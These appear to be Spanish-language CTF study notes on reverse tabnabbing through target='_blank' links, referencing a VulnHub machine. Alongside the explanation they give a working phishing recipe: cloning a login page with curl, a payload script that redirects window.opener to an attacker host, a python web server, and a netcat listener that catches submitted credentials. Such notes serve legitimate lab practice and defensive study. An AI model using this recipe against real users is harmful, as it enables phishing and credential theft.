### Explicación vulnerabilidad target blank

Esta vulnerabilidad, también conocida como **_reverse tabnabbing_**, un tipo de ataque de _phishing_ en el que el atacante reemplaza la pestaña legítima, y fiable, por un documento malicioso usando el selector _window.opener.location.assign()_ cuando se accede mediante un enlace de apertura en nueva ventana/pestaña, o sea del tipo _target=»_blank»._

Lo que hace el atacante es, usando el selector _window.opener.location_, llevar al usuario a alguna página falsa, que simula ser la original, o ejecuta algún JavaScript en la página de apertura en la que confía el usuario.

Explicado de manera sencilla, con el _reverse tabnabbing_, **cuando haces clic en una web para abrir una página nueva, y se abre en una nueva pestaña, si luego vuelves a la web original, sin que tú te des cuenta se cambia automáticamente esa página falsa que simula ser la buena**.

Parece la página web original que estabas viendo pero **tiene una url distinta** (que se puede ver claramente). El problema es que la mayoría de los usuarios no se dan cuenta de que la URL ha cambiado, ya que no se suelen fijar casi nunca, menos si piensan que están en una web en la que confían, por ejemplo esta.

Luego, por ejemplo, la página web falsa les pedirá que accedan de nuevo a su cuenta, y claro, pero ya no estás donde te creías que provienes sino en una copia de la pestaña original en la que hay otro documento, en este caso malicioso. **Si introduces tus datos ya te has entregado a los hackers** y harán lo que sea con tus credenciales.

### Ejemplo de uso
[Maquina Napping VulnHub (Mirar minuto 10)](https://www.youtube.com/watch?v=jVdfRTeOhnM)

Esta vulnerabilidad suele ocurrir [[Anotaciones varias#Cuando en una web hay un admin que revisa links, mensajes, etc]]

### Explotar vulnerabilidad

Queremos capturar unas credenciales de login al sitio web. para ello requerimos de 2 ficheros:

* Index.html (copia del index.html original del sitio)
* payload.html (donde irá el codigo malicioso)

#### Ficheros necesarios

##### Index.html
Para hacerse con el index, basta con:
```bash
curl -s <ip web donde esté el login> >index.html
```

##### Payload.html
El puerto que pongamos en el payload, será por el que escuchemos con netcat para recibir las credenciales
```bash
<html>
	<script>
			if (window.opener) window.opener.parent.location.replace("http://ip_atacante:443/index.html");
			if (window.parent != window) window.parent.location.replace("http://ip_atacante:443/index.html");
	</script>
</html>
```

#### Montar servidor y ponerse a la escucha
Montamos el servidor python donde tengamos el payload.html
```bash
pyhton3 -m http.server 80
```

En otro directorio diferente, tendremos el index.html y ahí nos ponemos a la escucha
```bash
nc -nlvp 443
```

#### Enviar URL a la víctima

Dependiendo del CTF se enviará de una u otra manera, pero el url que debemos enviarle es el siguiente: **http://ip_atacante:80/payload.html** es decir, le enviamos la URL de la web que estamos sirviendo con **python**


#### Resultado

La víctima accederá al fichero payload servido con python. sin que se de cuenta, su pestaña legítima (desde donde obtuvo el link, ahora lo que va a ver es index malicioso). Meterá sus credenciales ahí y nos llegará a nosotros por **netcat**




